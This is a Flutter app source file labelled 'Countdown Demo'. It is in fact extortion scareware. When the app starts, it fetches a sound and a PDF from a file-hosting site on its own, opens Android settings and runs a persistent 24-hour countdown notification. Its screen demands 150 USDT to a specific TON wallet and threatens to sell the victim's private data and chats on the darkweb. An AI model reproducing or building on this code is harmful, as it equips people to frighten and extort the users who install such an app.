import 'dart:async';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Countdown Demo',
      home: SplashScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class SplashScreen extends StatefulWidget {
  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen> {
  final AudioPlayer player = AudioPlayer();
  final FlutterLocalNotificationsPlugin notificationsPlugin =
      FlutterLocalNotificationsPlugin();

  Timer? countdownTimer;
  int secondsLeft = 86400; // 24 ساعة

  @override
  void initState() {
    super.initState();
    _initNotifications();
    _startCountdown();
    _playStartupSound();

    // بعد 5 ثواني، افتح الإعدادات وحمّل الملف
    Timer(Duration(seconds: 5), () {
      _openSettings();
      _downloadFile();
    });
  }

  void _playStartupSound() async {
    await player.play(
        UrlSource('https://files.catbox.moe/bkz6o8.mp3')); // صوت البداية
  }

  void _openSettings() {
    final intent = AndroidIntent(action: 'android.settings.SETTINGS');
    intent.launch();
  }

  void _downloadFile() async {
    try {
      final dio = Dio();
      final dir = await getApplicationDocumentsDirectory();
      final filePath = '${dir.path}/sample.pdf';

      await dio.download(
        'https://files.catbox.moe/omhyos.pdf',
        filePath,
      );

      _showDownloadNotification();

      print('تم تحميل الملف إلى: $filePath');
    } catch (e) {
      print('خطأ في التحميل: $e');
    }
  }

  void _showDownloadNotification() async {
    const AndroidNotificationDetails androidDetails =
        AndroidNotificationDetails(
      'download_channel',
      'Download Complete',
      importance: Importance.max,
      priority: Priority.high,
    );

    const NotificationDetails notificationDetails =
        NotificationDetails(android: androidDetails);

    await notificationsPlugin.show(
      1,
      'تم التحميل',
      'تم تحميل ملف PDF بنجاح!',
      notificationDetails,
    );
  }

  void _initNotifications() async {
    const AndroidInitializationSettings androidSettings =
        AndroidInitializationSettings('@mipmap/ic_launcher');

    const InitializationSettings initSettings =
        InitializationSettings(android: androidSettings);

    await notificationsPlugin.initialize(initSettings);
  }

  void _startCountdown() {
    countdownTimer = Timer.periodic(Duration(seconds: 1), (_) {
      if (secondsLeft > 0) {
        secondsLeft--;
        final time = _formatDuration(secondsLeft);
        _showCountdownNotification(time);
      } else {
        countdownTimer?.cancel();
      }
    });
  }

  void _showCountdownNotification(String timeLeft) async {
    const AndroidNotificationDetails androidDetails =
        AndroidNotificationDetails(
      'timer_channel',
      'Countdown Timer',
      importance: Importance.high,
      priority: Priority.high,
      ongoing: true,
      showWhen: false,
    );

    const NotificationDetails notificationDetails =
        NotificationDetails(android: androidDetails);

    await notificationsPlugin.show(
      0,
      'العد التنازلي',
      'الوقت المتبقي: $timeLeft',
      notificationDetails,
    );
  }

  String _formatDuration(int seconds) {
    final d = Duration(seconds: seconds);
    return d.toString().split('.').first.padLeft(8, "0");
  }

  @override
  void dispose() {
    countdownTimer?.cancel();
    player.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Stack(
      children: [
        Positioned.fill(
          child: Image.network(
            'https://wallpapers.com/images/hd/black-solid-background-1024-x-1365-r5a0xmfri40gdznl.jpg',
            fit: BoxFit.cover,
          ),
        ),
        Center(
          child: Text(
            "Hi bro, don't worry, nothing has happened yet, but you have 24 hours to send 150 USDT to this crypto wallet, or we will send all your privte data and chats and your perosnal informations to our store in darkweb. Send the money on this (ton) network and the address is: UQB7wop5BmicB85_eiv_azfZVFwlFUsrULNpCbSvScjpHigE  An important note: Even if you delete the application, your information is stored in our database and nothing will change.",
            style: TextStyle(
              color: Colors.green,
              fontSize: 12,
              fontWeight: FontWeight.bold,
            ),
          ),
        ),
      ],
    );
  }
}
